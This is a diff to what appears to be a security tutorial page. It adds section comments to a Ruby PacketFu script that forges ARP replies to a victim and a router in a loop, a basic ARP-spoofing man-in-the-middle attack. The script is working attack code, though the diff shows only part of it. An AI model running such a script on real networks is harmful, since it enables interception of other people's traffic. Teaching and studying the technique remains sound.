@@ -75,11 +75,17 @@ Source[^*]
 putting all together and run as `root`
 
 ```ruby
+#
+# ARP Spoof Basic script
+#
 require 'packetfu'
 
 
 info = PacketFu::Utils.whoami?(:iface => "wlan0")
 
+#
+# Victim
+#
 
 # Build Ethernet header
 arp_packet_victim = PacketFu::ARPPacket.new
@@ -92,7 +98,9 @@ arp_packet_victim.arp_saddr_ip = "192.168.0.1"          # the router's IP
 arp_packet_victim.arp_daddr_ip = "192.168.0.21"         # the victim's IP
 arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply
 
-
+#
+# Router
+#
 
 # Build Ethernet header
 arp_packet_router = PacketFu::ARPPacket.new
@@ -105,7 +113,9 @@ arp_packet_router.arp_saddr_ip = "192.168.0.21"         # the victim's IP
 arp_packet_router.arp_daddr_ip = "192.168.0.1"          # the router's IP
 arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
 
-
+#
+# Send
+#
 while true
     sleep 1
     puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
